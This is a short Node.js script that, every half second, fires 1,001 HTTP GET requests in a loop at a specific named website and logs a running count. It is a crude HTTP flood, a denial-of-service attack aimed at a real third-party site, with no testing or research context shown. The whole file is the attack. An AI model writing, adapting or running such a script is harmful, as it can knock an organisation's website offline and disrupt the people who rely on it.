const http = require('request')
var count = 0;
setInterval(function(){
  for(var i=0; i <= 1000; i++){
      http.get(`http://www.sindados-mg.org.br/`);
      count++
      console.log(count);
  }
}, 500)